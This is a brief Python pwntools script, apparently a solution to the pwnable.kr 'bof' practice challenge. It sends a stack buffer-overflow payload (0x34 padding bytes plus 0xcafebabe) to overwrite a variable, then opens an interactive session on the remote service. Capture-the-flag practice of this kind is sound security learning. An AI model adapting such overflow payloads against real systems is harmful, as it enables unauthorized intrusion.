###Simple bof to overwrite value

from pwn import *

r = remote('pwnable.kr',9000)
payload = b'a'*0x34+p32(0xcafebabe)
r.sendline(payload)
r.interactive()
